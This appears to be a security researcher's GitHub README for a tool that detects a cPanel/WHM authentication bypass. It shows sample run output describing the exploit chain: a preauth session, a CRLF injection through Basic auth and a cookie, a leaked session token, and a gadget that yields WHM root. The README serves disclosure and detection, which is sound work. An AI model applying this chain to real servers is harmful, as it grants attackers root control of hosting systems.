# CVE-2026-Pending cPanel/WHM Authentication Bypass - Detection Artifact Generator

cPanel/WHM Authentication Bypass Detection Artifact Generator Tool

https://github.com/user-attachments/assets/cf10c03c-6eda-4a0f-8c8b-c2578d71d2dd



# Description


This Detection Artifact Generator verifies if cPanel/WHM is vulnerable to a [recent](https://support.cpanel.net/hc/en-us/articles/40073787579671-cPanel-WHM-Security-Update-04-28-2026) authentication bypass.

# Detection in Action

Test against a vulnerable instance:

```
python authbypass-RCE.py --target https://target:2087/ 
                     __         ___  ___________
         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________
         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|
                          \/          \/     \/

        watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py

        (*) cPanel/WHM Authentication Bypass - Detection Artifact Generator

          - Sina Kheirkhah (@SinSinology) of watchTowr (@watchTowrcyber)

        CVEs: [CVE-2026-Pending]

[0] hostname = 
[1] minting a preauth session...
    session base = :vQ2WC5Bexp0oFSa7
[2] sending the CRLF injection (Basic auth + no-ob cookie)...
    HTTP 307, leaked token = /cpsess5691070609
[3] firing do_token_denied to propagate raw -> cache...
    HTTP 401, gadget fired
[4] verifying we're WHM root...
    /json-api/version -> HTTP 200  {"version":"11.110.0.89"}

```


# Affected Versions

Refer to cPanel website [here](https://support.cpanel.net/hc/en-us/articles/40073787579671-cPanel-WHM-Security-Update-04-28-2026)

# Follow [watchTowr](https://watchTowr.com) Labs

For the latest security research follow the [watchTowr](https://watchTowr.com) Labs Team 

- https://labs.watchtowr.com/

- https://x.com/watchtowrcyber
